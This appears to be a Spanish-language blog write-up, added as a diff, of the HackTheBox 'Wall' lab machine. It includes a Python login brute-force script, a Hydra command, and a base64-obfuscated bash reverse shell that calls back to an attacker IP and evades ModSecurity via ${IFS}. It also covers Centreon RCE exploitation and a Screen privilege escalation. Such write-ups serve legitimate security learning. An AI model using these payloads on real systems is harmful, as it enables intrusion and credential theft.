@@ -1,0 +1,267 @@
+      <!DOCTYPE html>
+  <html lang="es">
+    <head>
+      <meta charset="utf-8" />
+      <meta http-equiv="X-UA-Compatible" content="IE=endge, chrome=IE8" />
+      <meta name="viewport" content="initial-scale=1.0, width=device-width, user-scalable=no" />
+      <meta name="keywords" content="ctf,hackthebox,writeup,wall" />
+      <meta name="description" content="Apuntes y notas de un newbie." />
+      <meta name="author" content="root" />
+      
+        <title> [Writeup] HackTheBox: Wall
+ - [ root@paranoia ~/blog ]# _</title>
+     
+      <!--[if lte IE 8]><script type="text/javascript" src="/theme/js/html5shiv.js"></script><![endif]-->
+      <link href='https://fonts.googleapis.com/css?family=Inconsolata:400,700' rel='stylesheet' type='text/css'>
+      <link rel="stylesheet" type="text/css" href="css/theme.css" />
+      <link rel="stylesheet" type="text/css" href="css/pygment.css" />
+      <link rel="shortcut icon" type="image/png" href="/favicon.png" />
+      <!--[if lte IE 8]><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" /><![endif]-->
+    </head>
+    <body>
+        <div class="container">
+        <header id="menu">
+            <nav>
+                <ul>
+                    <li><a href="index.html">inicio</a></li>
+                    <li><a target="_blank" href="https://github.com/aljavier">github</a></li>
+                    <li><a href="enlaces.html">enlaces</a></li>
+                    <li><a href="about.html">acerca</a></li>
+                </ul>
+                <h4>[ root@paranoia ~/blog ]# _</h4>
+            </nav>
+        </header>
+         
+         
+         <article>
+                <header class="post-header">
+                    <div class="meta"><time datetime="2019-12-10 00:00:00">diciembre 10, 2019</time></div>
+                <h1>
+                     [Writeup] HackTheBox: Wall
+
+                </h1>
+                </header>
+                <div class="post-content"> 
+                    <h1>[Writeup] HackTheBox: Wall</h1>
+<p><img alt="Box information" src="images/htb/wall/info.png" /></p>
+<p>Comenzamos enumerando la máquina con <strong>Nmap</strong></p>
+<div class="codehilite"><pre><span></span><span class="err">nmap -sV -sC -O -oN nmap 10.10.10.157</span>
+</pre></div>
+
+
+<p><img alt="Nmap" src="images/htb/wall/nmap.png" /></p>
+<p>Podemos ver que tiene Apache corriendo en el puerto 80 en su versión 2.4.29 y que por lo visto tiene la página de inicio por defecto para Ubuntu. Si vamos a la IP en un navegador web se puede comprobar esto.</p>
+<p><img alt="Ubuntu Apache Default Page" src="images/htb/wall/default_page.png" /></p>
+<p>Algo importante a notar en la imagen es que tiene <a href="https://modsecurity.org">ModSecurity</a> como vemos donde dice <code>mods-enabled</code>. Esto es particularmente importante por lo que veremos más adelante.</p>
+<p>Continuando con los datos de Nmap podemos buscar vulnerabilidades conocidas para la versión de Apache en cuestión aquí, pero además de que no me enfoqué mucho en esto no encontré nada relevante en mí <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-199811/Apache-Http-Server-2.4.20.html">búsqueda</a>.</p>
+<p>También vemos que tiene ssh instalado, se podría probar haciendo brute-force pero no me enfoqué en esto ni en la versión de Linux instalada tampoco.</p>
+<p>Como a simple vista no vemos nada relevante que parezca sutil para un posible vector de ataque seguimos enumerando...ahora con <strong>dirb</strong> para enumerar directorios y archivos en el servidor web.</p>
+<div class="codehilite"><pre><span></span><span class="err">dirb http://10.10.10.157 /usr/share/dirb/wordlists/big.txt</span>
+</pre></div>
+
+
+<p><img alt="dirb" src="images/htb/wall/dirb_enum.png" /></p>
+<p><strong>Nota</strong>: <em>Yo usé el diccionario <code>big.txt</code> porque no me pareció suficiente lo que encontré con uno más pequeño...pero fue una pérdida de tiempo, resultó igual.</em></p>
+<p>Podemos ver que encontró dos directorios: <code>monitoring</code> y <code>server-status</code>. Este último no me pareció nada interesante, además de que da error de <code>Forbidden</code>, por tanto lo obvié.</p>
+<p>También podemos intentar algo diferente con <code>dirb</code> usando la opción <code>-X</code> para enumerar archivos <code>php</code> en vez de directorios.</p>
+<p><img alt="dirb2" src="images/htb/wall/dirb_enum2.png" /></p>
+<p>Nada interesante, sin embargo. Los archivos mostrados arriba son rabbit holes.</p>
+<p><code>/monitoring</code></p>
+<p><img alt="monitoring" src="images/htb/wall/monitoring.png" /></p>
+<p>Como puede verse es un directorio protegido con <a href="https://en.wikipedia.org/wiki/Basic_access_authentication">HTTP Basic Authentication</a>. Luego de probar algunas combinaciones e intentos fallidos de brute-forcing cambié de enfoque. Mayormente, luego de leer algunas sugerencias :)</p>
+<p>Ahora intentaremos bypassear este login con técnicas de <a href="https://www.owasp.org/index.php/Testing_for_HTTP_Verb_Tampering_(OTG-INPVAL-003)">HTTP Verb Tampering</a>. Para esto corremos BurpSuite y lo configuramos también a Firefox para interceptar los requests del navegador. Entonces accedemos igualmente a <code>/monitoring</code> en el navegador mientras tenemos el proxy activo en BurpSuite. Enviamos el request a <code>Repeater</code> y probamos diferentes verbos de HTTP.</p>
+<p><img alt="HTTP Post did it" src="images/htb/wall/monitoring_post.png" /></p>
+<p>Como podemos ver en el <code>Response</code> el código retornado nos muestra una etiqueta <code>&lt;meta&gt;</code> con un refresh, lo que significa que con <code>POST</code> podemos bypassear esto. Así que podemos ir directamente a http://10.10.10.157/centreon. </p>
+<p><img alt="Centreon Software" src="images/htb/wall/centreon.png" /></p>
+<p><a href="https://www.centreon.com/">Centreon</a> es un sistema de monitoreo de aplicaciones, sistemas y redes de código abierto, nos dice la Wikipedia.</p>
+<p>Tres cosas hice en este punto:</p>
+<ol>
+<li>Intentar <a href="https://documentation.centreon.com/docs/centreon/en/2.8.x/installation/from_VM.html">credenciales por defecto</a>. </li>
+<li>Hacer brute-force al login.</li>
+<li>Buscar vulnerabilidades conocidas para la versión v19.04.</li>
+</ol>
+<p>El problema con el punto #2 es que este formulario tiene protección de <code>CSRF</code> por lo que no podemos usar <strong>Hydra</strong>. Por eso hice el siguiente script en Python para hacer brute-force al formulario de login.</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.10.157/centreon/index.php&#39;</span>
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span> <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://127.0.0.1:8080&#39;</span> <span class="p">}</span> <span class="c1"># BurpSuite proxy</span>
+<span class="c1">#wordlist_file = &#39;/usr/share/wordlists/rockyou.txt&#39;</span>
+<span class="n">wordlist_file</span> <span class="o">=</span> <span class="s1">&#39;passwords.txt&#39;</span>
+
+<span class="k">def</span> <span class="nf">get_token</span><span class="p">(</span><span class="n">html</span><span class="p">):</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
+    <span class="n">token_input</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span><span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;centreon_token&#39;</span><span class="p">})</span> 
+    <span class="n">token</span> <span class="o">=</span> <span class="n">token_input</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="n">token_input</span> <span class="k">else</span> <span class="kc">None</span>
+
+    <span class="k">return</span> <span class="n">token</span>
+
+<span class="k">def</span> <span class="nf">get_token_and_cookies</span><span class="p">():</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">resp</span><span class="p">:</span>
+        <span class="n">cookies</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Set-Cookie&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># I don&#39;t want &#39;Path = /&#39; one</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">get_token</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">token</span><span class="p">,</span><span class="n">cookies</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Request failed&quot;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">cookies</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+    <span class="n">_data</span> <span class="o">=</span> <span class="p">{</span> 
+              <span class="s1">&#39;useralias&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> 
+              <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> 
+              <span class="s1">&#39;centreon_token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> 
+              <span class="s1">&#39;submitLogin&#39;</span><span class="p">:</span> <span class="s1">&#39;Connect&#39;</span> 
+            <span class="p">}</span>
+
+    <span class="n">_headers</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="n">cookies</span><span class="p">,</span> 
+                <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span> 
+                <span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span> 
+                <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span>
+               <span class="p">}</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">_headers</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">resp</span>
+
+
+<span class="k">def</span> <span class="nf">is_valid_login</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span><span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
+    <span class="n">error_div</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">,</span> <span class="n">class_</span><span class="o">=</span><span class="s1">&#39;error_msg&#39;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">error_div</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">error_div</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">True</span>
+
+
+<span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">passwords_file</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">passwords_file</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">passwd</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">):</span> <span class="c1"># Not readlines() because I don&#39;t want extra &#39;\n&#39;</span>
+             <span class="n">token</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">get_token_and_cookies</span><span class="p">()</span> 
+             <span class="n">resp</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">passwd</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">cookies</span><span class="p">,</span> <span class="n">proxies</span><span class="p">)</span>
+             <span class="k">if</span> <span class="n">is_valid_login</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
+                 <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">WE DID IT! USERNAME: &#39;</span><span class="si">{0}</span><span class="s2">&#39;| PASSWORD: &#39;</span><span class="si">{1}</span><span class="s2">&#39;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">passwd</span><span class="p">))</span>
+                 <span class="k">break</span>
+             <span class="k">else</span><span class="p">:</span>
+                 <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;WRONG!!! Username=</span><span class="si">{0}</span><span class="s1"> | Password=</span><span class="si">{1}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">passwd</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">let_the_game_begin</span><span class="p">():</span>
+    <span class="n">attack</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="n">wordlist_file</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">let_the_game_begin</span><span class="p">()</span>
+</pre></div>
+
+
+<p>Este script me dio par de problemas inicialmente, pero fue un error de lógica de mi parte. Notar que usé el proxy de BurpSuite para monitorear los datos que enviaba y recibía, me servía para debugging. El archivo <code>passwords.txt</code> contiene las primeras 50 palabras del diccionario <code>rockyou.txt</code>. </p>
+<p><img alt="Brute force con Script Python" src="images/htb/wall/brute_force_script.png" /></p>
+<p>El primer brute-force exitoso lo hice en verdad con <strong>Hydra</strong> y luego me encargué de arreglar mi script :| Sí... recuerdo que dije que no se podía usar Hydra por el CSRF pero sucede que Centreon tiene una <a href="https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html">API Restful</a> a la que sí podemos hacerle brute-force con Hydra.</p>
+<div class="codehilite"><pre><span></span><span class="err">hydra -v -l admin -P /usr/share/wordlists/rockyou.txt -t 4 10.10.10.157 http-post-form &#39;/centreon/api/index.php?action=authenticate:username=admin&amp;password=^PASS^:S=authToken&#39;</span>
+</pre></div>
+
+
+<p><img alt="Brute force con Hydra" src="images/htb/wall/brute_force_hydra.png" /></p>
+<p><em>Las credenciales eran tan simples que debí haberlas encontrado sin necesidad de brute-forcing...</em></p>
+<p><img alt="Logged in" src="images/htb/wall/werein.png" /></p>
+<p>Ahora procedemos a buscar vulnerabilidades conocidas para la versión del software. Rápidamente encontramos un CVE para esta versión sumamente interesante, ya que es un <code>Remote Code Execution</code> <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">CVE-2019-13024</a>. La vulnerabilidad se debe a datos enviados por usuarios no "sanitados" debidamente en una porción del código dónde se ejecutan comandos en el sistema operativo. Ver todos los detalles en el link del CVE. El autor del CVE también desarrolló un exploit <a href="https://gist.github.com/mhaskar/c4255f6cf45b19b8a852c780f50576da">centreon-exploit.py</a></p>
+<p>El exploit no me funcionó, así que lo modifiqué para que usara BurpSuite como proxy (tal cual como en el script arriba) y poder analizar mejor la data recibida y enviada. En muchas ocasiones la respuesta fue un <code>403: Forbidden</code>. Como entendía la vulnerabilidad luego de leer el artículo del autor del CVE además de haber visto el código del exploit y ya tenía el vector de ataque en BurpSuite lo intenté mejor manualmente y seguía dándome error de Forbidden o no ejecutando aparentemente el <code>payload</code>. </p>
+<p><img alt="Forbidden" src="images/htb/wall/403.png" /></p>
+<p>Para no extenderme más, recordar que la página inicial por defecto del servidor web tenía habilitado <code>ModSecurity</code>, de modo que esta era la razón por la que daba error <code>403</code> al intentar enviar ciertos comandos por el exploit o directamente en la aplicación web. ModSecurity, el <a href="https://es.wikipedia.org/wiki/Web_application_firewall">Web Application Firewall (WAF)</a> en el servidor estaba filtrando ciertos caracteres que enviábamos para evitar ataques. Entonces, tuvimos que aprender sobre <a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">WAF Evasion Techniques</a>. Luego de muchos intentos fallidos como pude explotar la vulnerabilidad fue de la manera siguiente:</p>
+<ol>
+<li>Ir a Configuración &gt; Pollers</li>
+<li>Agregar o modificar un <code>poller</code> manualmente en la aplicación web y colocar el comando "malicioso" en el campo <code>Monitoring Engine Binary</code> y poner el campo <code>Localhost</code> como <code>Yes</code>.</li>
+</ol>
+<p>Aquí hay que tener en cuenta que debemos usar una técnica apropiada para camuflar el comando "malicioso" y así bypassear el WAF. Para esto vamos a enviar el comando camuflado en base64 y otros caracteres especiales de bash. Usaremos un reverse shell con bash: </p>
+<div class="codehilite"><pre><span></span><span class="err">echo &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.93/9999 0&gt;&amp;1&#39; | base64</span>
+</pre></div>
+
+
+<div class="codehilite"><pre><span></span><span class="err">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45My85OTk5IDA+JjEK</span>
+</pre></div>
+
+
+<p>Payload en bash:</p>
+<div class="codehilite"><pre><span></span>echo<span class="cp">${</span><span class="n">IFS</span><span class="cp">}</span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45My85OTk5IDA+JjEK|base64<span class="cp">${</span><span class="n">IFS</span><span class="cp">}</span>-d|bash;
+</pre></div>
+
+
+<p><img alt="Add poller" src="images/htb/wall/poller.png" /></p>
+<p>Una vez le damos a <code>Save</code> ya no debería darnos error <code>403</code> porque hemos camuflado el comando malicioso con <code>base64</code> y palabras especiales de bash. En bash <code>${IFS}</code> es lo mismo que un espacio. Importante notar, que hemos terminado el comando con <code>";"</code>, para evitar un error de bash con lo que Centreon agrega luego (como se puede leer en el CVE). </p>
+<p>Ahora tenemos que llamar <code>generateFiles.php</code> especificando el "poller" creado para que ejecute nuestro payload. Para esto necesitamos BurpSuite configurado.</p>
+<p>Nos ponemos a la escucha en el puerto 9999:</p>
+<div class="codehilite"><pre><span></span><span class="err">nc -lvnp 9999</span>
+</pre></div>
+
+
+<p>Enviamos nuestro HTTP payload en BurpSuite con los datos correspondientes (PHPSESSID, debug=True, poller={id}, generate=True, etc) y obtenemos una shell como usuario <code>www-data</code></p>
+<p><img alt="we got shell" src="images/htb/wall/wwwdata_shell.png" /></p>
+<h2>De www-data shell a root</h2>
+<p>Usando <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnu.sh</a> script para enumerar podemos obtener algo como lo siguiente:</p>
+<p><img alt="Screen 4.5.0" src="images/htb/wall/binwall.png" /></p>
+<p>Podemos ver allí un programa que sobresale porque tiene la versión especificada. Este es el programa para manejo de sesiones de consola <code>Screen</code>. Si buscamos en la web vulnerabilidades para Screen 4.5.0 podríamos encontrar este exploit <a href="https://www.exploit-db.com/exploits/41154">Local Privilege Escalation</a>, exactamente lo que necesitamos.</p>
+<p>Primero verificamos el código antes de ejecutar (siempre verificar antes). No esta demás leer sobre la <a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">vulnerabilidad</a> tampoco. Parece consistir en que esta versión de <code>screen</code> hace un chequeo de un archivo de log como superusuario, el exploit trunca el archivo o crea uno nuevo con un payload malicioso para obtener una shell de root.</p>
+<p>Ejecutamos...</p>
+<p><img alt="Enviando el exploit" src="images/htb/wall/wget.png" /></p>
+<p>Got root?</p>
+<p><img alt="Got root" src="images/htb/wall/root.png" /></p>
+<h2>Terminando...</h2>
+<p>Creo que las razones por la que se puede bypassear la autenticación básica al principio es porque sólo esta limitado al método HTTP <code>GET</code>, por eso usando HTTP <code>POST</code> nos permite ver el contenido en ese directorio. Un problema de configuración, además de un método no muy seguro de autenticación. Ver imagen abajo con archivos que extraje de la máquina.</p>
+<p><img alt="Basic Auth setup" src="images/htb/wall/htacces.png" /></p>
+<p>Una vez rooteada la máquina quise saber porque razón me fallaban casi todos los payloads de ataque que usaba en Centreon, con error de <code>Forbidden</code>. Así que extraje las reglas de <code>modsecurity</code> del servidor, directorio <code>/etc/modsecurity</code>, y encontré lo siguiente:</p>
+<p><img alt="ModSecurity rules" src="images/htb/wall/modsec.png" /></p>
+<p>Mis dudas quedaron aclaradas ahí, terminaba casi todos los comandos con <code>#</code> al final para invalidar lo que Centron agregaba en el backend. Como se puede ver también bloquea comandos con ncat y otros.</p>
+                    
+                     
+                     <div class="plain-text-link">
+                          &laquo;<a href="htb-wall-writeup.txt" title="Ver en texto plano">txt</a>&raquo;
+                     </div>
+                    
+                </div>
+              
+                <hr/>
+                <!-- discus comments go here -->
+                 <div id="disqus_thread"></div>
+                <script type="text/javascript">
+                    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+                    var disqus_shortname = 'sysflux'; // required: replace example with your forum shortname
+                    /* * * DON'T EDIT BELOW THIS LINE * * */
+                    (function() {
+                        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
+                        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                    })();
+                </script>
+                <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                <a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+          </article>
+    
+       
+        <footer id="page-foot">
+            <p>
+                Contenido bajo licencia <a href="https://creativecommons.org/licenses/by-sa/4.0/legalcode"> CC BY-SA</a> 
+                | Powered by <a href="https://www.python.org/">Python</a> &copy;
+            </p>
+        </footer>
+        </div>
+        <!-- Google Analytics here -->
+        <script type="text/javascript">
+        var _gaq = _gaq || [];
+            _gaq.push(['_setAccount', 'UA-45917501-1']);
+            _gaq.push(['_trackPageview']);
+        (function() {
+          var ga = document.createElement('script'); 
+          ga.type = 'text/javascript'; ga.async = true;
+          ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+          var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+        })();
+      </script>
+    </body>
+    </html>
